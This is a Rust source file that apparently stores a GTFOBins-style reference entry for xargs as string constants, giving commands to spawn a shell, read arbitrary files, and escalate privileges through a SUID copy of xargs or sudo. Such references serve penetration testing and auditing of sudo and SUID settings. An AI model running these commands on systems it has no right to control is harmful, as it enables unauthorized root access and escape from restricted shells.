pub static BIN_NAME: &'static str = "xargs";
pub static SH_DESC_1: &'static str = "GNU version only.";
pub static SH_CODE_1: &'static str = r#"
    
    xargs -a /dev/null sh
"#;
pub static SH_CODE_2: &'static str = r#"
    
    echo x | xargs -Iy sh -c 'exec sh 0<&1'
"#;
pub static SH_DESC_3: &'static str = "Read interactively from `stdin`.";
pub static SH_CODE_3: &'static str = r#"
    
    xargs -Ix sh -c 'exec sh 0<&1'
    x^D^D
"#;
pub static FR_DESC: &'static str = r#"This works as long as the file does not contain the NUL character, also a trailing `$'\n'` is added. The actual `/bin/echo` command is executed. GNU version only."#;
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    xargs -a "$LFILE" -0
"#;
pub static SUID_DESC: &'static str = "GNU version only.";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which xargs) .

    ./xargs -a /dev/null sh -p
"#;
pub static SUDO_DESC: &'static str = "GNU version only.";
pub static SUDO_CODE: &'static str = r#"
    
    sudo xargs -a /dev/null sh
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SHELL_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SHELL_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static SH_3: Code<'static> = Code {
    title: "SHELL_CODE_3",
    code: SH_CODE_3,
    tag: Tag::SH,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
